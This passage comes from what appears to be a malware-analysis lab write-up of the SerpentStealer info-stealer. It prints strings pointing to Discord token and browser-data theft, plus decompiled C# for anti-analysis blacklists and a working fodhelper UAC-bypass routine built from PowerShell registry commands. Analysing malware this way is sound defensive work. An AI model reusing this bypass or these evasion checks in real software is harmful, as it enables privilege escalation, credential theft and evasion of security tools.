</span></span><span class="line"><span class="cl">https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=  
</span></span><span class="line"><span class="cl">&amp;steamids=  
</span></span><span class="line"><span class="cl">https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=  
</span></span><span class="line"><span class="cl">&amp;steamid=  
</span></span><span class="line"><span class="cl">https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=  
</span></span><span class="line"><span class="cl">Steam session detected  
</span></span><span class="line"><span class="cl">Steam Identifier:  
</span></span><span class="line"><span class="cl">Profile URL: https://steamcommunity.com/profiles/
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>A &ldquo;hacked&rdquo; discord link:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;================[ Steam Account:  
</span></span><span class="line"><span class="cl">]&gt;================&gt;  
</span></span><span class="line"><span class="cl">discord.gg/hacked  
</span></span><span class="line"><span class="cl">Steam Identifier: {0}  
</span></span><span class="line"><span class="cl">Display Name: {1}  
</span></span><span class="line"><span class="cl">Time created: {2}  
</span></span><span class="line"><span class="cl">Level: {3}
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>A &ldquo;Running Stealer&rdquo; log:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[+] Target Appears to not have discord..  
</span></span><span class="line"><span class="cl">[+] Target has discord installed. Running Stealer..  
</span></span><span class="line"><span class="cl">MASTERKEY :  
</span></span><span class="line"><span class="cl">DECRYPTED TOKEN :
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Enumerating browser storage folders:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State  
</span></span><span class="line"><span class="cl">Chrome  
</span></span><span class="line"><span class="cl">\AppData\Local\Google\Chrome\User Data\Local State  
</span></span><span class="line"><span class="cl">Edge  
</span></span><span class="line"><span class="cl">\AppData\Local\Microsoft\Edge\User Data\Local State
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>&ldquo;fodhelper.exe&rdquo; for <a class="link" href="https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-Alert-name/Fodhelper.exe-UAC-bypass&amp;ved=2ahUKEwix16WbutuLAxXLAHkGHYHKAU4QFnoECAYQAQ&amp;usg=AOvVaw1Z6kU32rjQo4z0rf_eqjop"  target="_blank" rel="noopener"
    >likely UAC bypass</a> and persistance via registry keys:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fodhelper.exe  
</span></span><span class="line"><span class="cl">New-Item  
</span></span><span class="line"><span class="cl">HKCU:\Software\Classes\ms-settings\Shell\Open\command  
</span></span><span class="line"><span class="cl">-Force  
</span></span><span class="line"><span class="cl">New-ItemProperty -Path  
</span></span><span class="line"><span class="cl">HKCU:\Software\Classes\ms-settings\Shell\Open\command  
</span></span><span class="line"><span class="cl">-Name  
</span></span><span class="line"><span class="cl">DelegateExecute  
</span></span><span class="line"><span class="cl">-Value  
</span></span><span class="line"><span class="cl">-Force  
</span></span><span class="line"><span class="cl">Set-ItemProperty -Path  
</span></span><span class="line"><span class="cl">HKCU:\Software\Classes\ms-settings\Shell\Open\command  
</span></span><span class="line"><span class="cl">-Name
</span></span></code></pre></td></tr></table>
</div>
</div><p>The list goes on.</p>
<p>As this is a dotnet assembly we can use a tool like <code>dnSpy</code> to decompile the file contents into an easily readable source code-like format.</p>
<p><img src="/post/lets-defend-serpent-stealer/images/dnspy1.png"
	width="270"
	height="198"
	srcset="/post/lets-defend-serpent-stealer/images/dnspy1_hu_9c1d591ede705fbf.png 480w, /post/lets-defend-serpent-stealer/images/dnspy1_hu_30be58da340f4503.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="136"
		data-flex-basis="327px"
	
></p>
<p><code>Evasion</code> immediately stands out as interesting, and SerpentStealer sounds to be a very likely main function.</p>
<p>Within <code>Evasion</code> are three sections: AntiAv, AntiVT, and UAC. AntiAv looks for processes and compares them to a blacklist of processes filled with common malware analysis files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Evasion</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Token: 0x0200001B RID: 27</span>
</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="kd">static</span> <span class="k">class</span> <span class="nc">AntiAv</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x06000038 RID: 56 RVA: 0x00004460 File Offset: 0x00002660</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="kt">bool</span> <span class="n">IsAvPresent</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">Process</span><span class="p">[]</span> <span class="n">processes</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetProcesses</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">processes</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="kt">string</span> <span class="n">processName</span> <span class="p">=</span> <span class="n">processes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ProcessName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="n">AntiAv</span><span class="p">.</span><span class="n">blackListedProcesses</span><span class="p">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">processName</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0400003C RID: 60</span>
</span></span><span class="line"><span class="cl"><span class="na">		[Nullable(1)]</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="k">readonly</span> <span class="kt">string</span><span class="p">[]</span> <span class="n">blackListedProcesses</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">string</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;ProcessHacker.exe&#34;</span><span class="p">,</span> <span class="s">&#34;httpdebuggerui.exe&#34;</span><span class="p">,</span> <span class="s">&#34;wireshark.exe&#34;</span><span class="p">,</span> <span class="s">&#34;fiddler.exe&#34;</span><span class="p">,</span> <span class="s">&#34;regedit.exe&#34;</span><span class="p">,</span> <span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span> <span class="s">&#34;taskmgr.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vboxservice.exe&#34;</span><span class="p">,</span> <span class="s">&#34;df5serv.exe&#34;</span><span class="p">,</span> <span class="s">&#34;processhacker.exe&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;vboxtray.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vmtoolsd.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vmwaretray.exe&#34;</span><span class="p">,</span> <span class="s">&#34;ida64.exe&#34;</span><span class="p">,</span> <span class="s">&#34;ollydbg.exe&#34;</span><span class="p">,</span> <span class="s">&#34;pestudio.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vmwareuser.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vgauthservice.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vmacthlp.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vmsrvc.exe&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;x32dbg.exe&#34;</span><span class="p">,</span> <span class="s">&#34;x64dbg.exe&#34;</span><span class="p">,</span> <span class="s">&#34;x96dbg.exe&#34;</span><span class="p">,</span> <span class="s">&#34;vmusrvc.exe&#34;</span><span class="p">,</span> <span class="s">&#34;prl_cc.exe&#34;</span><span class="p">,</span> <span class="s">&#34;prl_tools.exe&#34;</span><span class="p">,</span> <span class="s">&#34;qemu-ga.exe&#34;</span><span class="p">,</span> <span class="s">&#34;joeboxcontrol.exe&#34;</span><span class="p">,</span> <span class="s">&#34;ksdumperclient.exe&#34;</span><span class="p">,</span> <span class="s">&#34;xenservice.exe&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;joeboxserver.exe&#34;</span><span class="p">,</span> <span class="s">&#34;devenv.exe&#34;</span><span class="p">,</span> <span class="s">&#34;IMMUNITYDEBUGGER.EXE&#34;</span><span class="p">,</span> <span class="s">&#34;ImportREC.exe&#34;</span><span class="p">,</span> <span class="s">&#34;reshacker.exe&#34;</span><span class="p">,</span> <span class="s">&#34;windbg.exe&#34;</span><span class="p">,</span> <span class="s">&#34;32dbg.exe&#34;</span><span class="p">,</span> <span class="s">&#34;64dbg.exex&#34;</span><span class="p">,</span> <span class="s">&#34;protection_id.exex&#34;</span><span class="p">,</span> <span class="s">&#34;scylla_x86.exe&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;scylla_x64.exe&#34;</span><span class="p">,</span> <span class="s">&#34;scylla.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idau64.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idau.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idaq64.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idaq.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idaq.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idaw.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idag64.exe&#34;</span><span class="p">,</span> <span class="s">&#34;idag.exe&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;ida64.exe&#34;</span><span class="p">,</span> <span class="s">&#34;ida.exe&#34;</span><span class="p">,</span> <span class="s">&#34;ollydbg.exe&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>AntiVT appears to be checking for usernames commonly associated with VirusTotal:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Evasion</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Token: 0x0200001C RID: 28</span>
</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="kd">static</span> <span class="k">class</span> <span class="nc">AntiVT</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0600003A RID: 58 RVA: 0x0000468C File Offset: 0x0000288C</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="kt">bool</span> <span class="n">IsVirusTotal</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kt">string</span> <span class="n">userName</span> <span class="p">=</span> <span class="n">Environment</span><span class="p">.</span><span class="n">UserName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">Array</span><span class="p">.</span><span class="n">IndexOf</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">AntiVT</span><span class="p">.</span><span class="n">VtPCNames</span><span class="p">,</span> <span class="n">userName</span><span class="p">)</span> <span class="p">&gt;</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0400003D RID: 61</span>
</span></span><span class="line"><span class="cl"><span class="na">		[Nullable(1)]</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="k">readonly</span> <span class="kt">string</span><span class="p">[]</span> <span class="n">VtPCNames</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">string</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;05h00Gi0&#34;</span><span class="p">,</span> <span class="s">&#34;3u2v9m8&#34;</span><span class="p">,</span> <span class="s">&#34;43By4&#34;</span><span class="p">,</span> <span class="s">&#34;4tgiizsLimS&#34;</span><span class="p">,</span> <span class="s">&#34;6O4KyHhJXBiR&#34;</span><span class="p">,</span> <span class="s">&#34;7wjlGX7PjlW4&#34;</span><span class="p">,</span> <span class="s">&#34;8Nl0ColNQ5bq&#34;</span><span class="p">,</span> <span class="s">&#34;8VizSM&#34;</span><span class="p">,</span> <span class="s">&#34;Abby&#34;</span><span class="p">,</span> <span class="s">&#34;Amy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;AppOnFlySupport&#34;</span><span class="p">,</span> <span class="s">&#34;ASPNET&#34;</span><span class="p">,</span> <span class="s">&#34;azure&#34;</span><span class="p">,</span> <span class="s">&#34;BUiA1hkm&#34;</span><span class="p">,</span> <span class="s">&#34;BvJChRPnsxn&#34;</span><span class="p">,</span> <span class="s">&#34;cM0uEGN4do&#34;</span><span class="p">,</span> <span class="s">&#34;cMkNdS6&#34;</span><span class="p">,</span> <span class="s">&#34;DefaultAccount&#34;</span><span class="p">,</span> <span class="s">&#34;dOuyo8RV71&#34;</span><span class="p">,</span> <span class="s">&#34;DVrzi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;e60UW&#34;</span><span class="p">,</span> <span class="s">&#34;ecVtZ5wE&#34;</span><span class="p">,</span> <span class="s">&#34;EGG0p&#34;</span><span class="p">,</span> <span class="s">&#34;Frank&#34;</span><span class="p">,</span> <span class="s">&#34;fred&#34;</span><span class="p">,</span> <span class="s">&#34;G2DbYLDgzz8Y&#34;</span><span class="p">,</span> <span class="s">&#34;george&#34;</span><span class="p">,</span> <span class="s">&#34;GjBsjb&#34;</span><span class="p">,</span> <span class="s">&#34;Guest&#34;</span><span class="p">,</span> <span class="s">&#34;h7dk1xPr&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;h86LHD&#34;</span><span class="p">,</span> <span class="s">&#34;Harry Johnson&#34;</span><span class="p">,</span> <span class="s">&#34;HEUeRzl&#34;</span><span class="p">,</span> <span class="s">&#34;hmarc&#34;</span><span class="p">,</span> <span class="s">&#34;ICQja5iT&#34;</span><span class="p">,</span> <span class="s">&#34;IVwoKUF&#34;</span><span class="p">,</span> <span class="s">&#34;j6SHA37KA&#34;</span><span class="p">,</span> <span class="s">&#34;j7pNjWM&#34;</span><span class="p">,</span> <span class="s">&#34;John&#34;</span><span class="p">,</span> <span class="s">&#34;jude&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;Julia&#34;</span><span class="p">,</span> <span class="s">&#34;kEecfMwgj&#34;</span><span class="p">,</span> <span class="s">&#34;kFu0lQwgX5P&#34;</span><span class="p">,</span> <span class="s">&#34;KUv3bT4&#34;</span><span class="p">,</span> <span class="s">&#34;Lisa&#34;</span><span class="p">,</span> <span class="s">&#34;lK3zMR&#34;</span><span class="p">,</span> <span class="s">&#34;lmVwjj9b&#34;</span><span class="p">,</span> <span class="s">&#34;Louise&#34;</span><span class="p">,</span> <span class="s">&#34;Lucas&#34;</span><span class="p">,</span> <span class="s">&#34;mike&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;Mr.None&#34;</span><span class="p">,</span> <span class="s">&#34;noK4zG7ZhOf&#34;</span><span class="p">,</span> <span class="s">&#34;o6jdigq&#34;</span><span class="p">,</span> <span class="s">&#34;o8yTi52T&#34;</span><span class="p">,</span> <span class="s">&#34;OgJb6GqgK0O&#34;</span><span class="p">,</span> <span class="s">&#34;patex&#34;</span><span class="p">,</span> <span class="s">&#34;PateX&#34;</span><span class="p">,</span> <span class="s">&#34;Paul Jones&#34;</span><span class="p">,</span> <span class="s">&#34;pf5vj&#34;</span><span class="p">,</span> <span class="s">&#34;PgfV1X&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;PqONjHVwexsS&#34;</span><span class="p">,</span> <span class="s">&#34;pWOuqdTDQ&#34;</span><span class="p">,</span> <span class="s">&#34;PxmdUOpVyx&#34;</span><span class="p">,</span> <span class="s">&#34;QfofoG&#34;</span><span class="p">,</span> <span class="s">&#34;QmIS5df7u&#34;</span><span class="p">,</span> <span class="s">&#34;QORxJKNk&#34;</span><span class="p">,</span> <span class="s">&#34;qZo9A&#34;</span><span class="p">,</span> <span class="s">&#34;RDhJ0CNFevzX&#34;</span><span class="p">,</span> <span class="s">&#34;RGzcBUyrznReg&#34;</span><span class="p">,</span> <span class="s">&#34;S7Wjuf&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;server&#34;</span><span class="p">,</span> <span class="s">&#34;SqgFOf3G&#34;</span><span class="p">,</span> <span class="s">&#34;Steve&#34;</span><span class="p">,</span> <span class="s">&#34;test&#34;</span><span class="p">,</span> <span class="s">&#34;TVM&#34;</span><span class="p">,</span> <span class="s">&#34;txWas1m2t&#34;</span><span class="p">,</span> <span class="s">&#34;umyUJ&#34;</span><span class="p">,</span> <span class="s">&#34;Uox1tzaMO&#34;</span><span class="p">,</span> <span class="s">&#34;User01&#34;</span><span class="p">,</span> <span class="s">&#34;w0fjuOVmCcP5A&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;WDAGUtilityAccount&#34;</span><span class="p">,</span> <span class="s">&#34;XMiMmcKziitD&#34;</span><span class="p">,</span> <span class="s">&#34;xPLyvzr8sgC&#34;</span><span class="p">,</span> <span class="s">&#34;ykj0egq7fze&#34;</span><span class="p">,</span> <span class="s">&#34;DdQrgc&#34;</span><span class="p">,</span> <span class="s">&#34;ryjIJKIrOMs&#34;</span><span class="p">,</span> <span class="s">&#34;nZAp7UBVaS1&#34;</span><span class="p">,</span> <span class="s">&#34;zOEsT&#34;</span><span class="p">,</span> <span class="s">&#34;l3cnbB8Ar5b8&#34;</span><span class="p">,</span> <span class="s">&#34;xUnUy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;fNBDSlDTXY&#34;</span><span class="p">,</span> <span class="s">&#34;vzY4jmH0Jw02&#34;</span><span class="p">,</span> <span class="s">&#34;gu17B&#34;</span><span class="p">,</span> <span class="s">&#34;UiQcX&#34;</span><span class="p">,</span> <span class="s">&#34;21zLucUnfI85&#34;</span><span class="p">,</span> <span class="s">&#34;OZFUCOD6&#34;</span><span class="p">,</span> <span class="s">&#34;8LnfAai9QdJR&#34;</span><span class="p">,</span> <span class="s">&#34;5sIBK&#34;</span><span class="p">,</span> <span class="s">&#34;rB5BnfuR2&#34;</span><span class="p">,</span> <span class="s">&#34;GexwjQdjXG&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;IZZuXj&#34;</span><span class="p">,</span> <span class="s">&#34;ymONofg&#34;</span><span class="p">,</span> <span class="s">&#34;dxd8DJ7c&#34;</span><span class="p">,</span> <span class="s">&#34;JAW4Dz0&#34;</span><span class="p">,</span> <span class="s">&#34;GJAm1NxXVm&#34;</span><span class="p">,</span> <span class="s">&#34;UspG1y1C&#34;</span><span class="p">,</span> <span class="s">&#34;equZE3J&#34;</span><span class="p">,</span> <span class="s">&#34;BXw7q&#34;</span><span class="p">,</span> <span class="s">&#34;lubi53aN14cU&#34;</span><span class="p">,</span> <span class="s">&#34;5Y3y73&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;9yjCPsEYIMH&#34;</span><span class="p">,</span> <span class="s">&#34;GGw8NR&#34;</span><span class="p">,</span> <span class="s">&#34;JcOtj17dZx&#34;</span><span class="p">,</span> <span class="s">&#34;05KvAUQKPQ&#34;</span><span class="p">,</span> <span class="s">&#34;64F2tKIqO5&#34;</span><span class="p">,</span> <span class="s">&#34;7DBgdxu&#34;</span><span class="p">,</span> <span class="s">&#34;uHUQIuwoEFU&#34;</span><span class="p">,</span> <span class="s">&#34;gL50ksOp&#34;</span><span class="p">,</span> <span class="s">&#34;Of20XqH4VL&#34;</span><span class="p">,</span> <span class="s">&#34;tHiF2T&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;sal.rosenburg&#34;</span><span class="p">,</span> <span class="s">&#34;hbyLdJtcKyN1&#34;</span><span class="p">,</span> <span class="s">&#34;Rt1r7&#34;</span><span class="p">,</span> <span class="s">&#34;katorres&#34;</span><span class="p">,</span> <span class="s">&#34;doroth&#34;</span><span class="p">,</span> <span class="s">&#34;umehunt&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lastly UAC is for establishing persistence through User Account Control bypass, utilizing fodhelper.exe as previously suspected.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Evasion</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Token: 0x0200001D RID: 29</span>
</span></span><span class="line"><span class="cl"><span class="na">	[NullableContext(1)]</span>
</span></span><span class="line"><span class="cl"><span class="na">	[Nullable(0)]</span>
</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="k">class</span> <span class="nc">UAC</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0600003C RID: 60 RVA: 0x00004B30 File Offset: 0x00002D30</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Bypass</span><span class="p">(</span><span class="kt">string</span> <span class="n">A_0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&#34;powershell.exe&#34;</span><span class="p">,</span> <span class="n">UAC</span><span class="p">.</span><span class="n">psCMD1</span><span class="p">).</span><span class="n">WaitForExit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&#34;powershell.exe&#34;</span><span class="p">,</span> <span class="n">UAC</span><span class="p">.</span><span class="n">psCMD2</span><span class="p">).</span><span class="n">WaitForExit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&#34;powershell.exe&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="n">UAC</span><span class="p">.</span><span class="n">psCMD3</span><span class="p">,</span> <span class="n">A_0</span><span class="p">)).</span><span class="n">WaitForExit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&#34;powershell.exe&#34;</span><span class="p">,</span> <span class="s">&#34;fodhelper.exe&#34;</span><span class="p">).</span><span class="n">WaitForExit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0400003E RID: 62</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="k">readonly</span> <span class="kt">string</span> <span class="n">psCMD1</span> <span class="p">=</span> <span class="s">&#34;New-Item HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Force&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0400003F RID: 63</span>
</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="k">readonly</span> <span class="kt">string</span> <span class="n">psCMD2</span> <span class="p">=</span> <span class="s">&#34;New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Name DelegateExecute -Value  -Force&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x04000040 RID: 64</span>
